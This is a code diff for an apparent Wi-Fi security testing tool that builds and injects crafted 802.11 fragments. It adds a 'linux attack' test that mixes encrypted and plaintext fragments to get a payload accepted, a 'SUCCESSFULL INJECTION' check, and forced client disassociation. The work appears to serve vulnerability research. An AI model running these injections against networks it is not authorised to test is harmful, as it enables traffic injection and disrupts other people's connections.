@@ -56,8 +56,7 @@ class TestOptions():
 
 class MetaFrag():
 	# StartingAuth, AfterAuthRace
-	# AfterObtainedIp: when we (AP) gave the client an IP. Or when we (client) got an IP.
-	BeforeAuth, BeforeAuthDone, AfterAuth, AfterObtainedIp = range(4)
+	BeforeAuth, BeforeAuthDone, AfterAuth = range(3)
 
 	def __init__(self, frag, trigger, encrypted, inc_pn=1):
 		self.frag = frag
@@ -66,14 +65,17 @@ class MetaFrag():
 		self.inc_pn = inc_pn
 
 class TestCase():
-	"""Currently this is mainly to test ping replies"""
 	def __init__(self):
 		self.fragments = []
+		self.verify = None
 
 	def next_trigger_is(self, trigger):
 		if len(self.fragments) == 0:
 			return False
 		return self.fragments[0].trigger == trigger
+
+	def success_on(self, payload):
+		self.verify = payload
 
 	def next(self):
 		frag = self.fragments[0]
@@ -114,16 +116,17 @@ class Station():
 		self.otherip = None
 
 
-	def handle_mon_rx(self, p):
-		pass
+	def handle_mon(self, p):
+		if not self.obtained_ip: return
 
-	def handle_eth_rx(self, p):
-		print(repr(p))
+	def handle_eth(self, p):
+		if not self.obtained_ip: return
 
-		# TODO: How to automatically determine a successfull test?
-		# TODO XXX --- Make sure this is not a packet send by us!
-		if ARP in p and p[ARP].pdst == self.ip:
-			log(STATUS, "Received reply to (fragmented?) ARP request!", color="green")
+		repr(repr(p))
+
+		if self.test.verify and self.test.verify in raw(p):
+			log(STATUS, "SUCCESSFULL INJECTION", color="green")
+			print(repr(p))
 
 	def set_header(self, p, forward=False, prior=None):
 		"""Set addresses to send frame to the peer or the 3rd party station."""
@@ -133,7 +136,7 @@ class Station():
 		assert (prior == None) or (p.type == 2)
 
 		p.FCfield |= self.FCfield
-		if prior:
+		if prior != None:
 			p.subtype = 8
 			p.add_payload(Dot11QoS(TID=prior))
 
@@ -144,10 +147,13 @@ class Station():
 		# represents the final destination. Otherwise its the BSSID.
 		p.addr3 = destmac if p.FCfield & 1 else self.mac
 
-	def get_header(self, seqnum=0xAA, **kwargs):
-		"""Generate a default common header that is frequently used"""
+	def get_header(self, seqnum=0xAA, prior=1, **kwargs):
+		"""
+		Generate a default common header. By default use priority of 1 so destination
+		will still accept lower Packet Numbers on other priorities.
+		"""
 		header = Dot11(type="Data", SC=(seqnum << 4))
-		self.set_header(header, **kwargs)
+		self.set_header(header, prior=prior, **kwargs)
 		return header
 
 	def create_fragments(self, header, data, num_frags):
@@ -183,15 +189,53 @@ class Station():
 
 		return test
 
-	def generate_test_ping(self, trigger, num_frags=2):
+	def generate_test_ping(self, trigger, num_frags=2, encrypted=True):
+		magic = b"generate_test_ping"
 		header = self.get_header()
-		request = LLC()/SNAP()/IP(src=self.ip, dst=self.peerip)/ICMP()/Raw(b"generate_test_ping")
+		request = LLC()/SNAP()/IP(src=self.ip, dst=self.peerip)/ICMP()/Raw(magic)
 		frags = self.create_fragments(header, request, num_frags)
 
 		test = TestCase()
 		for frag in frags:
-			test.fragments.append(MetaFrag(frag, trigger, True))
+			test.fragments.append(MetaFrag(frag, trigger, encrypted))
+		test.success_on(magic)
 
+		return test
+
+	def generate_test_ping_mixed(self):
+		magic = b"generate_test_ping"
+		header = self.get_header()
+		request = LLC()/SNAP()/IP(src=self.ip, dst=self.peerip)/ICMP()/Raw(magic)
+		frag1, frag2 = self.create_fragments(header, request, 2)
+
+		#frag1.addr1 = "ff:ff:ff:ff:ff:ff"
+		#frag2.addr1 = "ff:ff:ff:ff:ff:ff"
+
+		test = TestCase()
+		test.fragments.append(MetaFrag(frag1, MetaFrag.AfterAuth, False))
+		test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, True))
+		test.success_on(magic)
+
+		return test
+
+	def generate_linux_attack_ping(self):
+		magic = b"generate_test_ping"
+		seqnum = 0xAA
+
+		header = self.get_header(seqnum=seqnum)
+		request = LLC()/SNAP()/IP(src=self.ip, dst=self.peerip)/ICMP()/Raw(magic)
+		frag1, frag2 = self.create_fragments(header, request, 2)
+
+		test = TestCase()
+		test.fragments.append(MetaFrag(frag1, MetaFrag.AfterAuth, True))
+
+		frag2enc = frag2.copy()
+		frag2enc.SC ^= (1 << 4) | 1
+		test.fragments.append(MetaFrag(frag2enc, MetaFrag.AfterAuth, True))
+
+		test.fragments.append(MetaFrag(frag2, MetaFrag.AfterAuth, False))
+
+		test.success_on(magic)
 		return test
 
 	def generate_test_eapol(self, num_bytes=16, num_frags=1):
@@ -250,12 +294,14 @@ class Station():
 		return test
 
 	def generate_tests(self):
-		#self.test = self.generate_test_arpping(MetaFrag.AfterObtainedIp)
-		self.test = self.generate_test_ping(MetaFrag.AfterObtainedIp, num_frags=1)
+		#self.test = self.generate_test_arpping(MetaFrag.AfterAuth)
+		#self.test = self.generate_test_ping(MetaFrag.AfterAuth, num_frags=1, encrypted=True)
 		#self.text = self.generate_test_eapol()
 		#self.test = self.generate_test_eapol_debug()
 		#self.test = self.generate_linux_attack()
 		#self.test = TestCase()
+		#self.test = self.generate_test_ping_mixed()
+		self.test = self.generate_linux_attack_ping()
 
 		# - Test case to check if the receiver supports interleaved priority
 		#   reception. It seems Windows 10 / Intel might not support this.
@@ -275,14 +321,12 @@ class Station():
 		# 1.9 Plaintext, encrypted, plaintext
 		# 2. Test 2 but first plaintext sent before installing key
 
-		log(STATUS, "Constructed test case")
-
-	def set_peermac(self, peermac):
-		self.peermac = peermac
+		log(STATUS, "Constructed test case", color="green")
 
 	def handle_connecting(self, peermac):
-		self.set_peermac(peermac)
-		self.generate_tests()
+		# If the address was already set, it should not be changing
+		assert self.peermac == None or self.peermac == peermac
+		self.peermac = peermac
 
 	def inject_next_frags(self, trigger):
 		frag = None
@@ -308,8 +352,7 @@ class Station():
 			self.daemon.inject_mon(Dot11(addr1="ff:ff:ff:ff:ff:ff"))
 			print("[Injected packet] Prevent ath9k_htc bug after fragment injection")
 
-	def handle_eapol_tx(self, eapol):
-		eapol = EAPOL(eapol)
+	def trigger_eapol_events(self, eapol):
 		key_type   = eapol.key_info & 0x0008
 		key_ack    = eapol.key_info & 0x0080
 		key_mic    = eapol.key_info & 0x0100
@@ -328,6 +371,11 @@ class Station():
 			self.inject_next_frags(MetaFrag.BeforeAuthDone)
 			self.txed_before_auth_done = True
 
+	def handle_eapol_tx(self, eapol):
+		eapol = EAPOL(eapol)
+		if self.obtained_ip:
+			self.trigger_eapol_events(eapol)
+
 		# - Send over monitor interface to assure order compared to injected fragments.
 		# - This is also important because the station might have already installed the
 		#   key before this script can send the EAPOL frame over Ethernet.
@@ -341,31 +389,22 @@ class Station():
 
 	def handle_authenticated(self):
 		"""Called after completion of the 4-way handshake or similar"""
+		if not self.obtained_ip: return
 
 		log(STATUS, "MetaFrag.AfterAuth", color="green")
 		self.tk = self.daemon.get_tk(self)
 		self.gtk, self.gtk_idx = self.daemon.get_gtk()
+
+		time.sleep(1)
 		self.inject_next_frags(MetaFrag.AfterAuth)
 
-	def set_ip_address(self, ip, peerip):
+	def set_ip_addresses(self, ip, peerip):
 		self.ip = ip
 		self.peerip = peerip
-
-	def handle_obtained_ip(self):
-		"""
-		We are client: called when just authenticated to AP *and* IP addresses known.
-		We are AP: called when client connected and requested IP.
-		"""
 		self.obtained_ip = True
-		self.ip = ip
-		self.peerip = peerip
 
-		# XXX --- RECONNECT AND GENERATE TESTS ?????? XXX
-		self.test = self.generate_test_ping(MetaFrag.AfterObtainedIp, num_frags=2)
-
-		log(STATUS, "MetaFrag.AfterObtainedIp", color="green")
-		self.inject_next_frags(MetaFrag.AfterObtainedIp)
-
+		# We can generate tests once we have an IP
+		self.generate_tests()
 
 class Daemon():
 	def __init__(self, options):
@@ -386,10 +425,10 @@ class Daemon():
 	def configure_daemon(self):
 		pass
 
-	def handle_mon_rx(self, p):
+	def handle_mon(self, p):
 		pass
 
-	def handle_eth_rx(self, p):
+	def handle_eth(self, p):
 		pass
 
 	@abc.abstractmethod
@@ -448,11 +487,11 @@ class Daemon():
 			sel = select.select([self.sock_mon, self.sock_eth, self.wpaspy_ctrl.s], [], [], 1)
 			if self.sock_mon in sel[0]:
 				p = self.sock_mon.recv()
-				if p != None: self.handle_mon_rx(p)
+				if p != None: self.handle_mon(p)
 
 			if self.sock_eth in sel[0]:
 				p = self.sock_eth.recv()
-				if p != None and Ether in p: self.handle_eth_rx(p)
+				if p != None and Ether in p: self.handle_eth(p)
 
 			if self.wpaspy_ctrl.s in sel[0]:
 				msg = self.wpaspy_ctrl.recv()
@@ -482,7 +521,25 @@ class Authenticator(Daemon):
 		tk = wpaspy_command(self.wpaspy_ctrl, "GET_TK " + station.peermac)
 		return bytes.fromhex(tk)
 
-	def handle_eth_rx(self, p):
+	def force_reconnect(self, station):
+		# Confirmed to *instantly* reconnect: Arch Linux, Windows 10 with Intel WiFi chip, iPad Pro 13.3.1
+		# Reconnects only after a few seconds: MacOS (same with other reasons and with deauthentication)
+		cmd = "DISASSOCIATE %s reason=%d" % (station.peermac, WLAN_REASON_CLASS3_FRAME_FROM_NONASSOC_STA)
+		wpaspy_command(self.wpaspy_ctrl, cmd)
+
+	def handle_eth_dhcp(self, p, station):
+		if not DHCP in p or not station.peermac in self.dhcp.leases: return
+
+		# This assures we only mark it was connected after receiving a DHCP Request
+		req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
+		if req_type != 3: return
+
+		peerip = self.dhcp.leases[station.peermac]
+		log(STATUS, "Client %s with IP %s has connected" % (station.peermac, peerip))
+		station.set_ip_addresses(self.arp_sender_ip, peerip)
+		self.force_reconnect(station)
+
+	def handle_eth(self, p):
 		# Ignore clients not connected to the AP
 		clientmac = p[Ether].src
 		if not clientmac in self.stations:
@@ -492,18 +549,12 @@ class Authenticator(Daemon):
 		self.dhcp.reply(p)
 		self.arp_sock.reply(p)
 
-		# Raise event when client is assigned an IP address
+		# Monitor DHCP messages to know when a client received an IP address
 		station = self.stations[clientmac]
-		if DHCP in p and not station.obtained_ip and clientmac in self.dhcp.leases:
-			req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
-			# This assures we only mark it was connected after receiving a DHCP Request
-			if req_type == 3:
-				# TODO: We should wait a bit until the peer received the DHCP Ack ...
-				peerip = self.dhcp.leases[clientmac]
-				log(STATUS, "Client %s with IP %s has connected" % (clientmac, peerip))
-				station.handle_obtained_ip(self.arp_sender_ip, peerip)
-
-		station.handle_eth_rx(p)
+		if not station.obtained_ip:
+			self.handle_eth_dhcp(p, station)
+		else:
+			station.handle_eth(p)
 
 	def handle_wpaspy(self, msg):
 		log(STATUS, "daemon: " + msg)
@@ -511,11 +562,7 @@ class Authenticator(Daemon):
 		if "AP-STA-CONNECTING" in msg:
 			cmd, clientmac = msg.split()
 			if not clientmac in self.stations:
-				# Already pre-allocate an IP for this client
-				clientip = self.dhcp.prealloc_ip(clientmac)
-
 				station = Station(self, self.apmac, "from-DS")
-				station.set_ip_address(self.arp_sender_ip, clientip)
 				self.stations[clientmac] = station
 
 			log(STATUS, "Client %s is connecting" % clientmac)
@@ -577,7 +624,6 @@ class Supplicant(Daemon):
 		super().__init__(options)
 		self.station = None
 		self.arp_sock = None
-		self.requesting_ip = True
 
 	def get_tk(self, station):
 		tk = wpaspy_command(self.wpaspy_ctrl, "GET tk")
@@ -590,10 +636,11 @@ class Supplicant(Daemon):
 		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
 		req = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
 		req = req/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=1337)
-		req = req/DHCP(options=[("message-type","discover"),"end"])
+		req = req/DHCP(options=[("message-type", "discover"), "end"])
+		print(repr(req))
 		self.sock_eth.send(req)
 
-	def send_dhcp_reply(self, offer):
+	def send_dhcp_request(self, offer):
 		rawmac = bytes.fromhex(self.station.mac.replace(':', ''))
 		myip = offer[BOOTP].yiaddr
 		sip = offer[BOOTP].siaddr
@@ -601,77 +648,68 @@ class Supplicant(Daemon):
 
 		reply = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.station.mac)/IP(src="0.0.0.0", dst="255.255.255.255")
 		reply = reply/UDP(sport=68, dport=67)/BOOTP(op=1, chaddr=rawmac, xid=1337)
-		reply = reply/DHCP(options=[("message-type", "request"), ("server_id", sip), ("requested_addr", myip),
+		reply = reply/DHCP(options=[("message-type", "request"), ("requested_addr", myip),
 					    ("hostname", "fragclient"), "end"])
 		self.sock_eth.send(reply)
 
-	def handle_eth_rx_connect(self, p):
+	def handle_eth_dhcp(self, p):
 		"""Handle packets needed to connect and request an IP"""
+		if not DHCP in p: return
 
-		# Some functions here may update this variable, so save it locally
-		requesting_ip = self.requesting_ip
+		req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
 
-		# Handle ARP requests once we have an IP
-		if self.arp_sock:
+		# DHCP Offer
+		if req_type == 2:
+			log(STATUS, "Received DHCP offer, sending DHCP request.")
+			self.send_dhcp_request(p)
+
+		# DHCP Ack
+		elif req_type == 5:
+			clientip = p[BOOTP].yiaddr
+			serverip = p[IP].src
+			log(STATUS, "Received DHCP ack. My ip is %s and router is %s." % (clientip, serverip))
+
+			self.initialize_ips(clientip, serverip)
+			self.reconnect()
+
+	def initialize_ips(self, clientip, serverip):
+		self.station.set_ip_addresses(clientip, serverip)
+		self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.station.ip, ARP_addr=self.station.mac)
+
+	def handle_eth(self, p):
+		if not self.station.obtained_ip:
+			self.handle_eth_dhcp(p)
+		else:
 			self.arp_sock.reply(p)
-
-		# Check for DHCP response packets if not yet connected
-		if DHCP in p and not self.station.obtained_ip:
-			req_type = next(opt[1] for opt in p[DHCP].options if isinstance(opt, tuple) and opt[0] == 'message-type')
-
-			# DHCP Offer
-			if req_type == 2:
-				self.send_dhcp_reply(p)
-
-			# DHCP Ack
-			elif req_type == 5:
-				clientip = p[BOOTP].yiaddr
-				serverip = p[IP].src
-				self.arp_sock = ARP_sock(sock=self.sock_eth, IP_addr=self.station.ip, ARP_addr=self.station.mac)
-
-				if requesting_ip:
-					self.check_reconnect(clientip, serverip)
-				else:
-					self.station.handle_obtained_ip(clientip, serverip)
-
-		return requesting_ip
-
-	def handle_eth_rx(self, p):
-		if not self.handle_eth_rx_connect(p):
-			self.station.handle_eth_rx(p)
+			self.station.handle_eth(p)
 
 	def handle_wpaspy(self, msg):
 		log(STATUS, "daemon: " + msg)
 
 		if "CTRL-EVENT-CONNECTED" in msg:
-			if self.requesting_ip:
+			if not self.station.obtained_ip:
 				# TODO: Create a timer in case retransmissions are needed
+
+				# Sleep to make sure the AP installed the key
+				time.sleep(1)
+				self.send_dhcp_discover()
 				self.send_dhcp_discover()
 			else:
 				self.station.handle_authenticated()
-				self.station.handle_obtained_ip()
 
+		# Trying to authenticate with 38:2c:4a:c1:69:bc (SSID='backupnetwork2' freq=2462 MHz)
 		elif "Trying to authenticate with" in msg:
 			p = re.compile("Trying to authenticate with (.*) \(SSID")
 			peermac = p.search(msg).group(1)
-			if self.requesting_ip:
-				self.station.set_peermac(peermac)
-			else:
-				self.station.handle_connecting(peermac)
+			self.station.handle_connecting(peermac)
 
-		elif not self.requesting_ip and "EAPOL-TX" in msg:
+		elif "EAPOL-TX" in msg:
 			cmd, srcaddr, payload = msg.split()
 			self.station.handle_eapol_tx(bytes.fromhex(payload))
 
-	def check_reconnect(self, clientip, serverip):
-		if not self.requesting_ip:
-			return
-
-		self.requesting_ip = False
-		self.station.set_ip_address(clientip, serverip)
-
+	def reconnect(self):
 		# TODO: Check that ROAM command always performs a deauthentication
-		log(STATUS, "Obtained IP address, will now reconnect.", color="green")
+		log(STATUS, "Reconnecting to the AP.", color="green")
 		wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")
 		wpaspy_command(self.wpaspy_ctrl, "ROAM " + self.station.peermac)
 
@@ -681,14 +719,8 @@ class Supplicant(Daemon):
 
 		# If the user already supplied IPs we can immediately perform tests
 		if self.options.clientip and self.options.routerip:
-			self.requesting_ip = False
-			self.station.set_ip_address(self.options.clientip, self.options.routerip)
+			self.initialize_ips(self.options.clientip, self.options.routerip)
 			wpaspy_command(self.wpaspy_ctrl, "SET ext_eapol_frame_io 1")
-
-		# Otherwise we first request an IP using DHCP and then reconnect
-		else:
-			self.requesting_ip = True
-		time.sleep(5)
 
 	def start_daemon(self):
 		log(STATUS, "Starting wpa_supplicant ...")
